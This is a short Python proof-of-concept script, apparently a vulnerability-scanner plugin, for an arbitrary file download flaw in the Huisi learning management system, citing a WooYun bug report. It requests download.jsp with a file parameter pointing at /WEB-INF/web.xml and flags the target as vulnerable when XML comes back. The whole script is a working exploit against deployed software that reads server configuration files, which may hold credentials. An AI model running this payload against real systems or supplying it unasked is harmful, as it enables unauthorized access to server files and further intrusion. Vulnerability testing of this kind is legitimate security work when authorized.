#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 汇思学习管理系统任意文件下载
referer: http://www.wooyun.org/bugs/wooyun-2010-0149619
author: Lucifer
description: \www\cw\skin1\jsp\download.jsp源码中,未经过文件类型检查和过滤，直接下载文件
'''
import sys
import requests
import warnings
def run(url):
        result = ['汇思学习管理系统任意文件下载','','']
        payload = "/cw/skin1/jsp/download.jsp?file=/WEB-INF/web.xml"
        vulnurl = url + payload
        try:
            req = requests.get(vulnurl, timeout=10, verify=False)

            if req.headers["Content-Type"] == "application/xml":
                result[2]=  '存在'
                result[1] = vulnurl
            else:
                result[2]=  '不存在'

        except:
            result[2]='不存在'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = run(sys.argv[1])
    